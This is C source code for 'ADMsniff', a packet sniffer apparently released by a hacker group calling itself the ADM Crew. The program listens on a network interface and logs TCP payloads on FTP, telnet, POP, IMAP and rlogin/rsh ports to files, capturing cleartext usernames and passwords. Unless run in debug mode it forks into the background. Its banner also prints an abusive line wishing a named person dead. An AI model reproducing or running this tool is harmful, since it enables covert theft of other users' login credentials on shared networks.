/***************************************************************************
                      ___      ______      _       _
                    /     \   |   _   \   |  \   /  |
                   |  / \  |  |  |  \  |  |   \_/   |
                   | |___| |  |  |_ /  |  |   \_/   |
..oO  THE          |  ---  |  |       /   |  |   |  |         CreW Oo..
                   '''   '''   '''''''    ''''   ''''        
                               presents

*****************************************************************************/

/************************************************************/
/*  ADM sniffer  (c) ADM  				    */
/* cc snif.c -lnsl -lsocket -lpcap  -L.  for sunos 5.5.1    */
/* u need to install  the lpcap before  !                   */
/* usage ADMsniff <device> [debug]                          */
/************************************************************/
/* 0.6: diz version work on SUNOS 5.5.1/leenux/bsd          */
/************************************************************/ 

#define VERSION "pub 0.6"

#include <stdio.h>
#include <string.h>
#include <memory.h>
#include <stdlib.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>

#include "pcap.h"
#include "ip.h"
#include "tcp.h"      

#define IPHDRSIZE  sizeof(struct iphdr)
#define TCPHDRSIZE sizeof(struct tcphdr)

#define ERROR -1
#define IPPROTO_TCP 6

char LOGPATH[] = "./";
u_short BOOG = 0;
u_short ETHHDRSIZE;
u_char *buf;
u_short coolport[] = {21,23,109,110,143,512,513,514,31337};


int Log() {
 u_short i=0;
 u_short len=0;
 u_short LOG = 0;

 short sport = 0;
 short dport = 0;

 FILE *filez;

 char logname[255];
 char     tmp[255];
 char     sip[255];
 char     dip[255];
 
 char     *data;
 struct tcphdr *tcp;
 struct iphdr  *ip;
 struct in_addr in;
 
 ip   = (struct iphdr   *)(buf+ETHHDRSIZE);
 tcp  = (struct tcphdr  *)(buf+IPHDRSIZE+ETHHDRSIZE);
 

 bzero (logname,sizeof(logname));
 bzero (tmp,sizeof(tmp));

 bzero (sip,sizeof(sip));
 bzero (dip,sizeof(dip));

 
   switch (ip->protocol) 
    {
   
   case IPPROTO_TCP:
    
   for ( i = 0; coolport[i] != 31337 ; i++ ) {
            if ( coolport[i] == ntohs ( tcp->th_sport ) ||  
            coolport[i] == ntohs ( tcp->th_dport ) )LOG=1;  
        }   
    
   if ( LOG != 1 ) return(1);
          
        sport =  ntohs(tcp->th_sport);
	dport =  ntohs(tcp->th_dport);
         
        in.s_addr = ip->saddr;         
        strcpy(sip,(char *)inet_ntoa(in));
        
        in.s_addr = ip->daddr;
        strcpy(dip,(char *)inet_ntoa(in));

        
        sprintf (logname, "%s%s:%d->", LOGPATH, sip, sport);
        sprintf (tmp, "%s:%d-P:6", dip, dport);
   
     if ( BOOG != 0 ) { 
        printf ("%s%s:%d->", LOGPATH, sip, sport);
        printf ("%s:%d-P:6\n", dip, dport);
       }
        
    	strcat(logname,tmp);
        filez = fopen(logname,"a+");
    
    	data = (char *)(buf+IPHDRSIZE+TCPHDRSIZE+ETHHDRSIZE);
    	len  = ntohs(ip->tot_len) - (IPHDRSIZE+TCPHDRSIZE);   
    	break;
   
      }

  
  fwrite(data,len,1,filez);
  fflush(filez);
  fclose(filez);
 

return(1);  
}             

 
 
void main(argc,argv)
int argc;
char **argv;
 {     
   struct pcap_pkthdr h;
   struct pcap *pcap_d;
   char            ebuf[255];
  
if ( argc < 2 ) { 
     printf("ADMsniff %s <device> [DEBUG] \n",VERSION);
     printf("ex   : admsniff le0\n");
     printf("debug: admsniff le0 debug\n");
     printf(" ..ooOO The ADM Crew OOoo.. \n");
     exit(ERROR);
     }

if ( argc >  2)BOOG = 1;
       
 if (( pcap_d = pcap_open_live(argv[1],4028,0,1000,ebuf)) == NULL) {
    printf("pcap_d error");
    exit(ERROR);
   }
 
 
ETHHDRSIZE = 14; 

if (strstr(argv[1],"ppp")) ETHHDRSIZE = 0;
if (strstr(argv[1],"lo"))  ETHHDRSIZE = 4;

printf("ADMsniff %s  in libpcap we trust !\n",VERSION);
printf("credit's: ADM, mel , ^pretty^ for the mail she's sent me\n");
printf("Juergen suxxx !@!#! and need to die !!@#!\n");
printf("blah! i'm tired :pp\n");



if ( BOOG == 0 )
 if ( fork() == 0 ) {
  printf("Phear I'm a Deamon brrr...\n");
		while(1) {  			
 		   buf = (u_char *)pcap_next(pcap_d,&h);
		   Log(); 	
 		} 
    }

if ( BOOG != 0 ) {
 printf("Debug !\n");
     while(1) {
        buf = (u_char *)pcap_next(pcap_d,&h);
        Log();
      }
  }                                                     

}
